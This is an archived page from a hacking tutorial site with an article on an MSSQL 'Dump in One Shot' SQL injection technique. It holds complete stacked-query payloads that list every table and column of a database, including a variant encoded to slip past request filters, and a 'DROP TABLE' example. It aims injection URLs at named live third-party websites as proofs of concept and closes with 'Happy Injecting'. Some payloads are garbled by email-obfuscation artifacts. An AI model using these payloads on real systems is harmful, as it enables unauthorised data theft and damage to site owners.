 <!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
<meta name="keywords" content="Security Idiots, Hacking Research Papers, Security Research Papers, Web application Penetration Testing, Web Pentesting, web Injection, SQL Injection, XSS, RFI, LFI, LDAP, XPATH, Bypass, RCE, XML Injection" />
<meta name="description" content="Explanation on MS SQL Dump in one shot query.">
<title>MSSQL DIOS (Dump in One Shot)</title>
<link rel="stylesheet" href="../../../css/skel.css" />
<link rel="stylesheet" href="../../../css/style.css" />
<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
<script src="../../../js/jquery.min.js"></script>
<script src="../../../js/jquery.dropotron.min.js"></script>
<script src="../../../js/skel.min.js"></script>
<script src="../../../js/skel-layers.min.js"></script>
<script src="../../../js/init.js"></script>
<script src="../../../js/jquery.treeview.js" type="text/javascript"></script>
<script src="../../../js/jquery.cookie.js" type="text/javascript"></script>
<script src="../../../js/demo.js" type="text/javascript"></script>
<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
<div id="fb-root"></div>
<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=727224234003200&version=v2.0";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));

</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-54093058-1', 'auto');
  ga('send', 'pageview');

</script>
<script id="dsq-count-scr" src="https://securityidiots-com.disqus.com/count.js" async></script>
</head>
<body class="left-sidebar"> 
<div id="header">
<div class="container">

<h1><a href="mssql-dios.html#" id="logo">Security Idiots</a></h1>

<nav id="nav">
<ul>
<li><a href="../../../index.html">Home</a></li>
<li>
<a href="mssql-dios.html">Categories</a>
<ul>
<li><a href="../../Information-Gathering/index.html">Information Gathering</a>
<ul>
 <li><a href="../../Information-Gathering/Cloudflare-Bypass/index.html">Cloudflare Bypass</a></li>
</ul>
</li>
<li><a href="../index.html">SQL Injection</a>
<ul>
<li><a href="index.html">MSSQL</a></li>
</ul>
</li>
<li><a href="../../Tricks/index.html">Tricks</a></li>
<li><a href="../../XSS/index.html">XSS</a></li>
<li><a href="../../LFI/index.html">LFI</a></li>
<li><a href="../../XPATH-Injection/index.html">XPATH Injection</a></li>
</ul>
</li>
<li><a href="https://www.youtube.com/watch?v=nMOyvIWn5Y8&list=PL5e1zp5ChO-S4nlMUy60AMIkB0XDgd8wb" target="_BLANK">Video Gallery</a></li>
<li><a href="../../../construction.html">The Idiots Team</a></li>
<li><a href="../../../construction.html">Contact Us</a></li>
</ul>
</nav>
</div>
</div>

<div id="main" class="wrapper style1">
<div class="container">
<div class="row"> 
<div id="sidebar" class="4u sidebar" style="width:25%;background:white;padding:20px;color:black; border: 2px solid #a1a1a1;border-radius: 25px;">
<section>
<header class="major">
<h2>Tutorials Browser</h2>
</header>
<div class="row half">
<ul id="browser" class="filetree">
<li><a href="../../../Web-Pentest.html"><span class="folder">Web Pentest</span></a><ul id="Web-Pentest"></ul></li>
</ul>
<script>
function SetOpt(type,element,path,title,name){
container = document.getElementById(element);
if(type=='folder')
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span><ul id="'+path+'"></ul></li>';
else
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span></li>';
container.innerHTML = container.innerHTML + element;
}
SetOpt('folder','Web-Pentest','Web-Pentest/Information-Gathering','Information-Gathering','Information-Gathering');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html');
SetOpt('folder','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Cloudflare-Bypass','Cloudflare-Bypass');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html');
SetOpt('folder','Web-Pentest','Web-Pentest/LFI','LFI','LFI');
SetOpt('file','Web-Pentest/LFI','Web-Pentest/LFI/guide-to-lfi.html','guide-to-lfi.html','guide-to-lfi.html');
SetOpt('folder','Web-Pentest','Web-Pentest/SQL-Injection','SQL-Injection','SQL-Injection');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/sql-evil-twin-injection.html','sql-evil-twin-injection.html','sql-evil-twin-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Blind-SQL-Injection.html','Blind-SQL-Injection.html','Blind-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/delete-query-injection.html','delete-query-injection.html','delete-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/update-query-injection.html','update-query-injection.html','update-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/time-based-blind-injection.html','time-based-blind-injection.html','time-based-blind-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/insert-query-injection.html','insert-query-injection.html','insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html','database-type-testing-sql-injection.html','database-type-testing-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/routed_sql_injection.html','routed_sql_injection.html','routed_sql_injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/multi-query-injection.html','multi-query-injection.html','multi-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-insert-query-injection.html','mssql-insert-query-injection.html','mssql-insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html');
SetOpt('folder','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/MSSQL','MSSQL','MSSQL');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html','mssql-dios.html','mssql-dios.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html');
SetOpt('folder','Web-Pentest','Web-Pentest/Tricks','Tricks','Tricks');
SetOpt('file','Web-Pentest/Tricks','Web-Pentest/Tricks/Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html');
SetOpt('folder','Web-Pentest','Web-Pentest/WAF-Bypass','WAF-Bypass','WAF-Bypass');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XPATH-Injection','XPATH-Injection','XPATH-Injection');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-XPATH-injection.html','Basics-XPATH-injection.html','Basics-XPATH-injection.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/xpath-injection-part-1.html','xpath-injection-part-1.html','xpath-injection-part-1.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XSS','XSS','XSS');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss.series-by-securityidiots.html','xss.series-by-securityidiots.html','xss.series-by-securityidiots.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XXE','XXE','XXE');
SetOpt('file','Web-Pentest/XXE','Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html');

</script> </div>
</section>
</div>  <div id="content" class="8u skel-cell-important">
<section class="lol" style="padding:10px;background:#C9C9C2;color:black; border: 2px solid #a1a1a1;border-radius: 8px;">
<header class="major">
<h3><span class="byline">MSSQL DIOS (Dump in One Shot)</span></h3>
<div class="row no-collapse-1">
<span class="post-description" style="text-align:justify;">In the Name of ALLAH the Most Beneficent and the Merciful<br><br>
Zenodermus, Ch3rn0by1 and Me were workin on MSSQL..<br>
when Zenodermus thought to make a DIOS for MSSQL..<br><br>
previously at http://websec.ca/kb/sql_injection<br><br>
DIOS is under the heading Retrieving Multiple Tables and Columns<br>
<pre>AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="0f7776324f7776">[email&#160;protected]</a> ' ' name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;
</pre><br>
but thats output is like
<pre>table1:column1
table1:column2
table1:column3
table2:column1
table2:column2
table2:column3
table3:column1
and so on..
</pre>
But after adding some thing to this query.. by Zenodermus.. it became Cool like this u can see in this pic.<br>
<img src="../../../post_images/OQoVFp91.png">
<br><br>
But due to Character limit in available dataype VARCHAR(8000) we cannot see the complete output(mean all tables and columns).. jux because each time table is written with each column..<br><br>
So we decided to make it more cool and tried to display all data(complete tables and columns list). Later after surfing on MSDN, Google and MSSQL documentation we came to know, that actual length of varchar(MAX) or varchar(8000) is not 8000 it is 4000 even when u declare it MAX or 8000.<br><br>
And than it became our obsession to somehow make it, and now heres our final query output which allows us to extract more data in one Query and gives us much managed output.<br>
<img src="../../../post_images/Jq7B7sx1.png">
<br><br>
Before Going into this you must know about Stacked Queries, i will recommend to read the complete article at <a href="http://www.sqlinjection.net/stacked-queries/">http://www.sqlinjection.net/stacked-queries/</a><br><br>
In simple words <b>"With Stacked Queries we can Execute multiple statements in the same query to extend the possibilities of SQL injections"</b>.<br><br>
<pre>Example:
SELECT * FROM products WHERE productid=1; drop table admin
Injection example..
http://site.com/page.aspx?id=1; Drop table admin-- -
</pre><br>
<iframe width="560" height="315" src="https://www.youtube.com/embed/XzM_uLmyfNo" frameborder="0" allowfullscreen></iframe>
<br><br>
STACKED QUERY SUPPORT.<br>
<img src="../../../post_images/stacked_q1.png"><br><br>
<b><u>THE BASIC QUERY:</u></b><br>
Get all tables In one Query<br>
<pre>BEGIN DECLARE @a varchar(8000) SET @a='|' SELECT @<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="2544186544">[email&#160;protected]</a>%2b'&lt;li&gt;'%2btable_name FROM information_schema.tables SELECT @a AS output INTO dios_table_out END
</pre><br>
Get all Tables and columns In one Query<br>
<pre>BEGIN DECLARE @a varchar(8000) SET @a='|' SELECT @<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="30510d7051">[email&#160;protected]</a>%2b'&lt;li&gt;'%2btable_name%2b' :: '%2bcolumn_name FROM information_schema.columns SELECT @a AS output INTO dios_table_out END
</pre><br>
A little Modifications<br>
<pre>BEGIN DECLARE @a varchar(8000) SET @a='&lt;b&gt;&lt;font color=&quot;red&quot; size=3&gt;Injected By Zen&lt;/font&gt;&lt;/b&gt;&lt;br&gt;&lt;b&gt;Version : &lt;/b&gt;'%<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="62500022">[email&#160;protected]</a>@version%2b'&lt;br&gt;&lt;b&gt;Database : &lt;/b&gt;'%2bdb_name()%2b'&lt;br&gt;&lt;br&gt;' SELECT @<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="b9d884f9d8">[email&#160;protected]</a>%2b'&lt;li&gt;'%2btable_name%2b' :: '%2bcolumn_name FROM information_schema.columns SELECT @a AS output INTO dios_out END
</pre>
<br>
And in the end here is our Final Query:<br>
<pre>BEGIN
DECLARE @data VARCHAR(8000), @counter int, @tblName VARCHAR(50), @colNames VARCHAR(100)
DECLARE @tmpTbl TABLE (name VARCHAR(8000) NOT NULL)
SET @counter = 1
SET @data = 'injected by rummykhan :: ' + @@VERSION + ' Database :: ' + DB_NAME()
SET @tblName = ''
SET @colNames = ''
WHILE @counter<=(SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES)
BEGIN
	SET @colNames = ''
	SELECT @tblName = table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN (select name from @tmpTbl)
	SELECT @colNames = @colNames +  column_name + ' : ' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = @tblName
	INSERT @tmpTbl VALUES(@tblName)
	SET @data = @data + 'Table : ' + @tblName  ' + Columns : ' + @colNames
	SET @counter = @counter + 1
END
SELECT @data AS output INTO Challenge
END
</pre><br>
Well This Query looks horible but it actually is not. Lets go deep into this Query. with BEGIN and END we declare a Batch/Group of statements to be executed together.<br>
<br>
Next step is declaring supporting variables for holding table_name, column_name, a counter, one variable that can hold all table_names and column_names and one table with one column which will be acting as a collection which will be used to hold all the tables names.. will explain its use later.<br><br>
Next step is initializing declared variables.. we cannot use these un-initialized variables in SELECT statement..
thats why these are initialized with empty strings.. and @data with database version and database for further display in output..<br><br>
Next step is WHILE Loop<br>
<pre>WHILE @counter<=(SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES)
</pre><br>
Above statement will bound this loop to run through all tables. At next step @colNames is re initialized with empty string everytime to hold the coloums of Only One table at a time.<br><br>
The Next step is getting a table_name into @tblName and getting column_name for that table into @colNames and adding values of both @tblName and @colNames into @data<br><br>
Now this part<br>
<pre>SELECT @tblName = table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN (select name from @tmpTbl)
</pre><br>
With the above Query <b>SELECT @tblName = table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME </b>only one table will be fetched. To get next table in next iteration we used NOT IN Clause. But NOT IN Clause need a collection for which we declared a TABLE @tmpTbl with a COLUMN named name.<br><br>
For first time @tmpTbl will b empty so first table_name will b retrieved in @tblName. Then the part <b>INSERT @tmpTbl VALUES(@tblName)</b> each time @tblName value will be inserted in @tmpTbl and when it will goto this line again
<b>SELECT @tblName = table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN (select name from @tmpTbl)</b>
Next table will b retrieved from this statement and so on. As @tmpTbl have first table_name now and so on.<br><br>
when the loop will end all tables and columns will be added in @data, and then with the below statement<br>
<pre>SELECT @data AS output INTO Challenge
</pre><br>
we can store all @data into new table Challenge<br><br>
Here is the complete Query:<br>
<pre> 
http://site.com/page.aspx?id=1;BEGIN DECLARE @data VARCHAR(8000), @counter int, @tblName VARCHAR(50), @colNames VARCHAR(100) DECLARE @tmpTbl TABLE (name VARCHAR(8000) NOT NULL) SET @counter = 1 SET @data =  'injected by rummykhan :: '  @@VERSION  ' Database :: '  DB_NAME() SET @tblName = '' SET @colNames = '' WHILE @counter<=(SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES) BEGIN SET @colNames = '' SELECT @tblName = table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN (select name from @tmpTbl) SELECT @colNames = @colNames   column_name  ' : ' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = @tblName INSERT @tmpTbl VALUES(@tblName) SET @data = @data   'Table : '  @tblName  ' Columns : '  @colNames SET @counter = @counter   1 END SELECT @data AS output INTO Challenge END-- -
</pre>
<br>
Remember to change with %2b becuase is taken as space when sent from URL
<br>
For the Challenge site our final query will be like:<br>
<pre>http://www.uwdmaindia.org/EventDetails.aspx?ID=3';BEGIN DECLARE @data VARCHAR(8000), @counter int, @tblName VARCHAR(50), @colNames VARCHAR(100) DECLARE @tmpTbl TABLE (name VARCHAR(8000) NOT NULL) SET @counter = 1 SET @data=' injected by rummykhan :: '%<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="60520220">[email&#160;protected]</a>@version%2b'&lt;br/&gt;'%2bdb_name() SET @tblName = '' SET @colNames = '' WHILE @counter&lt;=(SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES) BEGIN SET @colNames = '' SELECT @tblName = table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN (select name from @tmpTbl) SELECT @colNames = @colNames %2b' : '%2bcolumn_name  FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = @tblName INSERT @tmpTbl VALUES(@tblName) SET @<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="dabebbaebbe79abebbaebb">[email&#160;protected]</a>%2b'&lt;br/&gt;&lt;br/&gt;Table : '%<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="b684d4f6c2d4daf8d7dbd3">[email&#160;protected]</a>%2b'&lt;br/&gt;Columns : '%<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="dceebe9cbfb3b092bdb1b9af">[email&#160;protected]</a>%2b'&lt;br/&gt;' SET @counter = @counter %2b 1 END SELECT @data AS output INTO Challenge END-- -</pre><br>
And now the final part of the Challenge and STEP 2<br><br>
<span style="color: red;"><b>HOW TO SEE THE OUTPUT ON WEBPAGE.</b></span>
<pre>http://site.com/page.aspx?id=-1 union select 1,2,3,output,5 from Challenge-- -
And heres how it will work on a live site:
http://www.uwdmaindia.org/EventDetails.aspx?ID=0' union all select 1,2,3,4,5,output,7,8 from Challenge-- -
</pre><br>
Running first query multiple time will result in error that an object of Challenge already exist. So dont forget to drop that table after running the query first time.<br>
<pre>http://www.uwdmaindia.org/EventDetails.aspx?ID=0'; DROP TABLE Challenge-- -
</pre><br>
And in some cases where System.Web.HttpException is enabled there HTML tags will be parsed as dangerous requests
so i changed the query a bit and this will work fine in almost every scenario.
<pre>;begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="d5e7b795">[email&#160;protected]</a>@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y&lt;=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="8beab6cbea">[email&#160;protected]</a> %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where <a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="cc988d8e808993828d8189f18cb6">[email&#160;protected]</a> insert @myTbl values(@z) SET @<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="40387d0038">[email&#160;protected]</a> %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="0e3c6c4e74">[email&#160;protected]</a>%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%<a href="../../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="ddefbf9dbc">[email&#160;protected]</a>%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END-- -</pre>
<br>
Here are some of the POC: <br><br>
<a href="http://www.aiou.edu.pk/Programmes.asp?PID=74%20and%200%3D1%20UNION%20SELECT%2b1%2Coutput%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%20from%20dios_out--">http://www.aiou.edu.pk</a><br>
<a href="http://www.uwdmaindia.org/EventDetails.aspx?ID=0%27%20union%20all%20select%201%2C2%2C3%2C4%2C5%2Coutput%2C7%2C8%20from%20Challenge--%20-">http://www.uwdmaindia.org</a><br>
<a href="http://greenforce.com.pk/page.aspx?page_id=24%20UNION%20SELECT%20null,null,output,null,null,null,null%20from%20Chall1--%20-">greenforce.com.pk</a>
<br><br>
Thanks For reading, Happy Injecting.<br><img src="../../../post_images/dios1.jpg" width=0>
<br>Author : Rummy Khan & Zen<br>Date : 2014-07-29</span><br><br></div><div id="disqus_thread"></div>
<script data-cfasync="false" src="../../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
var disqus_config = function () {
this.page.url = "http://securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html";  
this.page.identifier = "44";
};

(function() {
var d = document, s = d.createElement('script');
s.src = 'https://securityidiots-com.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> </div>
</header>
</section>
</div>
</div>
</div>
</div>

<div id="footer">
<div class="container">

<div class="row">
<div class="8u">
<section>
<header class="major">
<h2>Connect with Security Idiots</h2>
<span class="byline">Learn & share more on Hacking and Security</span>
</header>
<div class="row">
